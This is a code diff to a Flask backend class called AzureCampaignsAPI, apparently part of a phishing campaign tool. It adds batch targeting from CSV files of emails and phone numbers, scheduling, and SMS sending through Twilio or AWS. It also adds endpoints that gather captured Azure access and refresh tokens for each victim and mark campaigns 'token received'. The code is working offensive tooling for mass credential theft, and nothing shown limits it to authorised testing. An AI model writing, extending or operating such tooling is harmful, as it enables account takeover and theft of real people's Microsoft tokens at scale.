@@ -9,7 +9,7 @@ import tempfile
 import os
 import logging
 from datetime import datetime, timedelta
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List
 from flask import request, jsonify
 import boto3
 from twilio.rest import Client
@@ -47,10 +47,20 @@ class AzureCampaignsAPI:
                 platform = data['platform']  # Should be 'azure'
                 provider = data['provider']  # 'twilio' or 'aws'
                 
+                # Handle CSV file uploads
+                if data.get('targetMethod') == 'file':
+                    return self._start_csv_campaign(data, platform, provider)
+                
+                # Debug: Log the received data
+                logger.info(f"Building campaign command with data: {data}")
+                
                 # Build command based on platform and provider
                 cmd_args = self._build_campaign_command(data)
                 if not cmd_args:
                     return jsonify({'success': False, 'error': 'Invalid campaign configuration'}), 400
+                
+                # Debug: Log the built command
+                logger.info(f"Built command: {' '.join(cmd_args)}")
                 
                 # Generate campaign ID
                 campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
@@ -129,7 +139,7 @@ class AzureCampaignsAPI:
 
         @self.app.route('/api/azure-campaigns/list', methods=['GET'])
         def list_azure_campaigns():
-            """List all campaigns."""
+            """List all campaigns (both active and scheduled)."""
             try:
                 # Update campaign statuses
                 for campaign_id, campaign in self.active_campaigns.items():
@@ -145,7 +155,10 @@ class AzureCampaignsAPI:
                         campaign['finished'] = datetime.now().isoformat()
                     
                     # Check process status for running campaigns
-                    if 'process' in campaign and campaign['status'] == 'running':
+                    if campaign.get('batch_mode'):
+                        # Handle batch campaigns with multiple processes
+                        self._update_batch_campaign_status(campaign)
+                    elif 'process' in campaign and campaign['status'] == 'running':
                         process = campaign['process']
                         if process.poll() is not None:  # Process has finished
                             if tokens:
@@ -155,13 +168,53 @@ class AzureCampaignsAPI:
                                 campaign['status'] = 'completed' if process.returncode == 0 else 'failed'
                             campaign['finished'] = datetime.now().isoformat()
                 
-                # Create JSON-serializable copy without process objects
+                # Create JSON-serializable copy without process objects for active campaigns
                 campaigns_json = []
                 for campaign in self.active_campaigns.values():
                     campaign_copy = campaign.copy()
                     # Remove non-serializable objects
                     campaign_copy.pop('process', None)
+                    
+                    # For batch campaigns, remove processes array and add summary info
+                    if campaign_copy.get('batch_mode'):
+                        campaign_copy.pop('processes', None)
+                        campaign_copy.pop('targets', None)  # Remove detailed target info to reduce payload
+                        # Keep the status and count info which was updated by _update_batch_campaign_status
+                    
                     campaigns_json.append(campaign_copy)
+                
+                # Add scheduled campaigns to the main list
+                scheduled_jobs = self.scheduler.get_scheduled_jobs()
+                azure_jobs = [job for job in scheduled_jobs if job['job_type'] == 'azure_campaign']
+                
+                for job in azure_jobs:
+                    # Convert scheduled job to campaign format
+                    campaign_from_job = {
+                        'id': f"scheduled_{job['id']}",
+                        'platform': job['job_data'].get('platform', 'azure'),
+                        'provider': job['job_data'].get('provider', 'unknown'),
+                        'name': job['job_name'],
+                        'status': job['status'],
+                        'started': job.get('executed_at') or job.get('scheduled_time'),
+                        'target_count': 1,  # Scheduled jobs are typically single target
+                        'scheduled': True,
+                        'scheduled_time': job['scheduled_time'],
+                        'job_id': job['id'],
+                        'created_at': job.get('created_at'),
+                        'campaign_id': job.get('campaign_id')
+                    }
+                    
+                    # For completed scheduled campaigns, check for captured tokens
+                    if job['status'] == 'completed' and job.get('campaign_id'):
+                        tokens = self._find_campaign_tokens(job['campaign_id'], job['job_name'])
+                        if tokens:
+                            campaign_from_job['status'] = 'token received'
+                            campaign_from_job['tokens_captured'] = len(tokens)
+                    
+                    campaigns_json.append(campaign_from_job)
+                
+                # Sort campaigns by start time (most recent first)
+                campaigns_json.sort(key=lambda x: x.get('started', ''), reverse=True)
                 
                 return jsonify({'success': True, 'campaigns': campaigns_json})
                 
@@ -265,9 +318,13 @@ class AzureCampaignsAPI:
                 
                 campaign = self.active_campaigns[campaign_id]
                 
-                # Get output from subprocess if still running
+                # Get output from subprocess(es)
                 output = ""
-                if 'process' in campaign:
+                
+                if campaign.get('batch_mode'):
+                    # For batch campaigns, aggregate output from all processes
+                    output = self._get_batch_campaign_output(campaign)
+                elif 'process' in campaign:
                     process = campaign['process']
                     if process.poll() is None:  # Still running
                         # Try to read available output without blocking
@@ -286,15 +343,27 @@ class AzureCampaignsAPI:
                         if stdout_data:
                             output += stdout_data.decode()
                         if stderr_data:
-                            output += "\n--- STDERR ---\n" + stderr_data.decode()
+                            stderr_text = stderr_data.decode()
+                            # Only show stderr if it doesn't contain help/usage text (indicates actual errors)
+                            if not ('usage:' in stderr_text or 'the following arguments are required' in stderr_text):
+                                output += "\n--- STDERR ---\n" + stderr_text
+                
+                if not output:
+                    output = "No output yet..."
                 
                 # Check for token files and parse them
-                tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
+                if campaign.get('batch_mode'):
+                    # For batch campaigns, only show tokens from targets in this batch
+                    tokens = self._find_batch_campaign_tokens(campaign)
+                    sms_sent = campaign.get('completed_targets', 0)
+                else:
+                    tokens = self._find_campaign_tokens(campaign_id, campaign.get('name', ''))
+                    sms_sent = 1 if 'Text message successfully sent' in output else 0
                 
                 # Calculate stats
                 stats = {
                     'status': campaign.get('status', 'unknown'),
-                    'sms_sent': 1 if 'Text message successfully sent' in output else 0,
+                    'sms_sent': sms_sent,
                     'tokens_captured': len(tokens),
                     'runtime': self._calculate_runtime(campaign.get('started'))
                 }
@@ -377,6 +446,29 @@ class AzureCampaignsAPI:
                 logger.error(f"Error downloading campaign tokens: {str(e)}")
                 return jsonify({'success': False, 'error': str(e)}), 500
 
+        @self.app.route('/api/azure-campaigns/logs/scheduled_tokens', methods=['POST'])
+        def get_scheduled_campaign_tokens():
+            """Get tokens for a scheduled campaign."""
+            try:
+                data = request.get_json()
+                job_name = data.get('job_name', '')
+                target_email = data.get('target_email', '')
+                campaign_id = data.get('campaign_id', '')
+                
+                # For scheduled campaigns, find tokens based on target email
+                tokens = self._find_scheduled_campaign_tokens(target_email, job_name, campaign_id)
+                
+                return jsonify({
+                    'success': True,
+                    'tokens': tokens,
+                    'job_name': job_name,
+                    'target_email': target_email
+                })
+                
+            except Exception as e:
+                logger.error(f"Error getting scheduled campaign tokens: {str(e)}")
+                return jsonify({'success': False, 'error': str(e)}), 500
+
         @self.app.route('/api/azure-campaigns/schedule', methods=['POST'])
         def schedule_azure_campaign():
             """Schedule an Azure campaign for later execution."""
@@ -389,14 +481,81 @@ class AzureCampaignsAPI:
                     if not data.get(field):
                         return jsonify({'success': False, 'error': f'{field} is required'}), 400
                 
+                # Handle CSV content if provided
+                if data.get('targetMethod') == 'file' and data.get('csvContent'):
+                    try:
+                        targets = self._parse_csv_targets(data['csvContent'])
+                        if not targets:
+                            return jsonify({'success': False, 'error': 'No valid targets found in CSV'}), 400
+                        
+                        # Schedule individual jobs for each target
+                        scheduled_jobs = []
+                        for i, target in enumerate(targets):
+                            # Create job data for individual target
+                            job_data = data.copy()
+                            job_data['targetEmail'] = target['email']
+                            job_data['targetPhone'] = target['phone']
+                            job_data['name'] = f"{data['name']} - Target {i+1}"
+                            
+                            # Remove CSV content from individual job data
+                            job_data.pop('csvContent', None)
+                            job_data.pop('targetMethod', None)
+                            
+                            # Parse scheduled time
+                            try:
+                                scheduled_time = datetime.fromisoformat(data['scheduledTime'].replace('Z', '+00:00'))
+                                # Convert to naive datetime for consistent comparison
+                                if scheduled_time.tzinfo is not None:
+                                    scheduled_time = scheduled_time.replace(tzinfo=None)
+                            except ValueError as e:
+                                return jsonify({'success': False, 'error': f'Invalid scheduled time format: {str(e)}'}), 400
+                            
+                            # Check if scheduled time is in the future (compare in UTC)
+                            from datetime import timezone
+                            now_utc = datetime.now(timezone.utc).replace(tzinfo=None)
+                            if scheduled_time <= now_utc:
+                                return jsonify({'success': False, 'error': 'Scheduled time must be in the future'}), 400
+                            
+                            # Schedule individual job
+                            job_id = self.scheduler.schedule_job(
+                                JobType.AZURE_CAMPAIGN,
+                                job_data['name'],
+                                scheduled_time,
+                                job_data
+                            )
+                            scheduled_jobs.append(job_id)
+                        
+                        logger.info(f"Scheduled {len(scheduled_jobs)} Azure campaign jobs for CSV batch '{data['name']}' at {scheduled_time}")
+                        
+                        return jsonify({
+                            'success': True,
+                            'job_ids': scheduled_jobs,
+                            'target_count': len(targets),
+                            'scheduled_time': scheduled_time.isoformat(),
+                            'message': f'Scheduled {len(targets)} campaign jobs successfully'
+                        })
+                        
+                    except Exception as e:
+                        logger.error(f"Error processing CSV for scheduling: {str(e)}")
+                        return jsonify({'success': False, 'error': f'CSV processing error: {str(e)}'}), 400
+                
+                # Handle single target scheduling (existing logic)
+                if not data.get('targetEmail') or not data.get('targetPhone'):
+                    return jsonify({'success': False, 'error': 'targetEmail and targetPhone are required for single target campaigns'}), 400
+                
                 # Parse scheduled time
                 try:
                     scheduled_time = datetime.fromisoformat(data['scheduledTime'].replace('Z', '+00:00'))
+                    # Convert to naive datetime for consistent comparison
+                    if scheduled_time.tzinfo is not None:
+                        scheduled_time = scheduled_time.replace(tzinfo=None)
                 except ValueError as e:
                     return jsonify({'success': False, 'error': f'Invalid scheduled time format: {str(e)}'}), 400
                 
-                # Check if scheduled time is in the future
-                if scheduled_time <= datetime.now():
+                # Check if scheduled time is in the future (compare in UTC)
+                from datetime import timezone
+                now_utc = datetime.now(timezone.utc).replace(tzinfo=None)
+                if scheduled_time <= now_utc:
                     return jsonify({'success': False, 'error': 'Scheduled time must be in the future'}), 400
                 
                 # Schedule the job
@@ -486,15 +645,13 @@ class AzureCampaignsAPI:
             # Add target information
             if data.get('targetMethod') == 'single':
                 if data.get('targetEmail'):
-                    cmd.extend(['--email', data['targetEmail']])
+                    cmd.extend(['-e', data['targetEmail']])
                 if data.get('targetPhone'):
-                    cmd.extend(['--phone', data['targetPhone']])
+                    cmd.extend(['-p', data['targetPhone']])
             else:
-                # Handle file upload - for now, we'll create a temporary file
-                # In production, you'd want to handle file uploads properly
-                if data.get('targetFile'):
-                    # This would need proper file handling
-                    cmd.extend(['-f', '/tmp/targets.csv'])  # Placeholder
+                # This should not be reached for file uploads as they are handled separately
+                logger.error("File upload reached single target command builder - this should not happen")
+                return None
             
             # Add provider-specific arguments
             if provider == 'twilio':
@@ -570,6 +727,40 @@ class AzureCampaignsAPI:
         
         return tokens
 
+    def _find_scheduled_campaign_tokens(self, target_email: str, job_name: str, campaign_id: str) -> list:
+        """Find and parse token files generated by scheduled campaigns."""
+        import glob
+        import os
+        tokens = []
+        
+        try:
+            # Look for token files that match the target email
+            # Azure tokens: {email}.azure_token.json
+            token_file = f"{target_email}.azure_token.json"
+            
+            if os.path.exists(token_file):
+                try:
+                    with open(token_file, 'r') as f:
+                        token_data = json.load(f)
+                    
+                    tokens.append({
+                        'email': target_email,
+                        'access_token': token_data.get('access_token', 'N/A'),
+                        'refresh_token': token_data.get('refresh_token', 'N/A'),
+                        'token_type': token_data.get('token_type', 'Bearer'),
+                        'scope': token_data.get('scope', 'N/A'),
+                        'expires_in': token_data.get('expires_in', 3600),
+                        'file': token_file,
+                        'captured_at': os.path.getmtime(token_file)
+                    })
+                except Exception as e:
+                    logger.error(f"Error parsing scheduled token file {token_file}: {str(e)}")
+            
+        except Exception as e:
+            logger.error(f"Error finding scheduled campaign token files: {str(e)}")
+        
+        return tokens
+
     def _calculate_runtime(self, started_time: str) -> str:
         """Calculate how long the campaign has been running."""
         if not started_time:
@@ -612,3 +803,266 @@ class AzureCampaignsAPI:
         except Exception as e:
             logger.error(f"Error checking campaign expiry: {str(e)}")
             return False
+
+    def _start_csv_campaign(self, data: Dict[str, Any], platform: str, provider: str) -> any:
+        """Start a campaign with CSV target list."""
+        try:
+            # Get CSV data from the request
+            csv_content = data.get('csvContent')
+            if not csv_content:
+                return jsonify({'success': False, 'error': 'CSV content is required for file uploads'}), 400
+            
+            # Parse CSV content
+            targets = self._parse_csv_targets(csv_content)
+            if not targets:
+                return jsonify({'success': False, 'error': 'No valid targets found in CSV'}), 400
+            
+            logger.info(f"Parsed {len(targets)} targets from CSV")
+            
+            # Generate campaign ID for the batch
+            campaign_id = f"{platform}_{provider}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_batch"
+            
+            # Store batch campaign info
+            self.active_campaigns[campaign_id] = {
+                'id': campaign_id,
+                'platform': platform,
+                'provider': provider,
+                'name': data['name'],
+                'status': 'starting',
+                'started': datetime.now().isoformat(),
+                'target_count': len(targets),
+                'targets': targets,
+                'batch_mode': True,
+                'completed_targets': 0,
+                'failed_targets': 0,
+                'processes': []  # Store individual processes
+            }
+            
+            # Start individual campaigns for each target
+            for i, target in enumerate(targets):
+                target_data = data.copy()
+                target_data['targetMethod'] = 'single'
+                target_data['targetEmail'] = target['email']
+                target_data['targetPhone'] = target['phone']
+                
+                # Build command for this target
+                cmd_args = self._build_campaign_command(target_data)
+                if not cmd_args:
+                    logger.error(f"Failed to build command for target {target['email']}")
+                    continue
+                
+                # Set environment variables for AWS
+                env = os.environ.copy()
+                if provider == 'aws':
+                    if target_data.get('awsAccessKeyId'):
+                        env['AWS_ACCESS_KEY_ID'] = target_data['awsAccessKeyId']
+                    if target_data.get('awsSecretAccessKey'):
+                        env['AWS_SECRET_ACCESS_KEY'] = target_data['awsSecretAccessKey']
+                    if target_data.get('awsSessionToken'):
+                        env['AWS_SESSION_TOKEN'] = target_data['awsSessionToken']
+                    if target_data.get('awsRegion'):
+                        env['AWS_DEFAULT_REGION'] = target_data['awsRegion']
+                
+                # Get the correct working directory
+                current_file = os.path.abspath(__file__)
+                root_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(current_file)))))
+                
+                # Start process for this target
+                process = subprocess.Popen(
+                    cmd_args, 
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE,
+                    env=env,
+                    cwd=root_dir
+                )
+                
+                # Store process info
+                self.active_campaigns[campaign_id]['processes'].append({
+                    'target': target,
+                    'process': process,
+                    'status': 'running'
+                })
+                
+                logger.info(f"Started process for target {target['email']}: {' '.join(cmd_args)}")
+            
+            self.active_campaigns[campaign_id]['status'] = 'running'
+            
+            return jsonify({
+                'success': True, 
+                'message': f'Batch campaign started with {len(targets)} targets',
+                'campaign_id': campaign_id,
+                'target_count': len(targets)
+            })
+            
+        except Exception as e:
+            logger.error(f"Error starting CSV campaign: {str(e)}")
+            return jsonify({'success': False, 'error': str(e)}), 500
+
+    def _parse_csv_targets(self, csv_content: str) -> List[Dict[str, str]]:
+        """Parse CSV content and return list of valid targets."""
+        targets = []
+        lines = csv_content.strip().split('\n')
+        
+        for line_num, line in enumerate(lines, 1):
+            line = line.strip()
+            if not line:  # Skip empty lines
+                continue
+                
+            parts = line.split(',')
+            if len(parts) != 2:
+                logger.warning(f"CSV line {line_num}: Invalid format (expected 2 columns, got {len(parts)})")
+                continue
+            
+            email = parts[0].strip()
+            phone = parts[1].strip()
+            
+            # Basic validation
+            if '@' not in email:
+                logger.warning(f"CSV line {line_num}: Invalid email format: {email}")
+                continue
+            
+            if not phone.startswith('+'):
+                logger.warning(f"CSV line {line_num}: Phone should start with +: {phone}")
+                continue
+            
+            targets.append({
+                'email': email,
+                'phone': phone,
+                'line_number': line_num
+            })
+        
+        return targets
+
+    def _update_batch_campaign_status(self, campaign: Dict[str, Any]) -> None:
+        """Update status of a batch campaign by checking all individual processes."""
+        if not campaign.get('processes'):
+            return
+        
+        completed_count = 0
+        failed_count = 0
+        running_count = 0
+        total_tokens = 0
+        
+        for proc_info in campaign['processes']:
+            process = proc_info['process']
+            target = proc_info['target']
+            
+            if process.poll() is not None:  # Process finished
+                if process.returncode == 0:
+                    completed_count += 1
+                    # Check for tokens for this target
+                    tokens = self._find_scheduled_campaign_tokens(target['email'], campaign['name'], campaign['id'])
+                    total_tokens += len(tokens)
+                else:
+                    failed_count += 1
+                proc_info['status'] = 'completed' if process.returncode == 0 else 'failed'
+            else:
+                running_count += 1
+                proc_info['status'] = 'running'
+        
+        # Update campaign status based on process states
+        campaign['completed_targets'] = completed_count
+        campaign['failed_targets'] = failed_count
+        campaign['tokens_captured'] = total_tokens
+        
+        if running_count == 0:  # All processes finished
+            if total_tokens > 0:
+                campaign['status'] = 'token received'
+            elif failed_count == 0:
+                campaign['status'] = 'completed'
+            elif completed_count > 0:
+                campaign['status'] = 'partial success'
+            else:
+                campaign['status'] = 'failed'
+            campaign['finished'] = datetime.now().isoformat()
+        else:
+            campaign['status'] = 'running'
+
+    def _find_batch_campaign_tokens(self, campaign: Dict[str, Any]) -> list:
+        """Find tokens that were captured by this specific batch campaign."""
+        tokens = []
+        
+        try:
+            # For batch campaigns, find all Azure tokens created after the campaign started
+            # This is the best we can do without storing the target list
+            campaign_start = datetime.fromisoformat(campaign['started'].replace('Z', '+00:00'))
+            
+            import glob
+            token_files = glob.glob('*.azure_token.json')
+            
+            for token_file in token_files:
+                try:
+                    # Check if this token was created after the campaign started (with 1 minute buffer)
+                    token_modified = datetime.fromtimestamp(os.path.getmtime(token_file))
+                    
+                    if token_modified >= campaign_start - timedelta(minutes=1):
+                        with open(token_file, 'r') as f:
+                            token_data = json.load(f)
+                        
+                        # Extract email from filename
+                        email = token_file.replace('.azure_token.json', '')
+                        
+                        tokens.append({
+                            'email': email,
+                            'access_token': token_data.get('access_token', 'N/A'),
+                            'refresh_token': token_data.get('refresh_token', 'N/A'),
+                            'token_type': token_data.get('token_type', 'Bearer'),
+                            'scope': token_data.get('scope', 'N/A'),
+                            'expires_in': token_data.get('expires_in', 3600),
+                            'file': token_file,
+                            'captured_at': os.path.getmtime(token_file)
+                        })
+                except Exception as e:
+                    logger.error(f"Error parsing token file {token_file}: {str(e)}")
+        except Exception as e:
+            logger.error(f"Error finding batch campaign tokens: {str(e)}")
+        
+        return tokens
+
+    def _get_batch_campaign_output(self, campaign: Dict[str, Any]) -> str:
+        """Get aggregated output from all processes in a batch campaign."""
+        output = ""
+        
+        if not campaign.get('processes'):
+            return "Batch campaign output not available"
+        
+        try:
+            output += f"=== BATCH CAMPAIGN: {campaign.get('name', 'Unknown')} ===\n"
+            output += f"Total Targets: {campaign.get('target_count', 0)}\n"
+            output += f"Completed: {campaign.get('completed_targets', 0)}\n"
+            output += f"Failed: {campaign.get('failed_targets', 0)}\n"
+            output += f"Tokens Captured: {campaign.get('tokens_captured', 0)}\n"
+            output += "=" * 50 + "\n\n"
+            
+            # Add output from individual processes
+            for i, proc_info in enumerate(campaign['processes'], 1):
+                target = proc_info.get('target', {})
+                process = proc_info.get('process')
+                status = proc_info.get('status', 'unknown')
+                
+                output += f"--- Target {i}: {target.get('email', 'Unknown')} ({target.get('phone', 'Unknown')}) ---\n"
+                output += f"Status: {status}\n"
+                
+                if process:
+                    try:
+                        if process.poll() is None:  # Still running
+                            output += "Process still running...\n"
+                        else:
+                            # Process finished, get output
+                            stdout_data, stderr_data = process.communicate()
+                            if stdout_data:
+                                output += "Output:\n" + stdout_data.decode() + "\n"
+                            if stderr_data:
+                                stderr_text = stderr_data.decode()
+                                # Filter out help text
+                                if not ('usage:' in stderr_text or 'the following arguments are required' in stderr_text):
+                                    output += "Errors:\n" + stderr_text + "\n"
+                    except Exception as e:
+                        output += f"Error reading process output: {str(e)}\n"
+                
+                output += "\n"
+                
+        except Exception as e:
+            output += f"Error generating batch campaign output: {str(e)}\n"
+        
+        return output
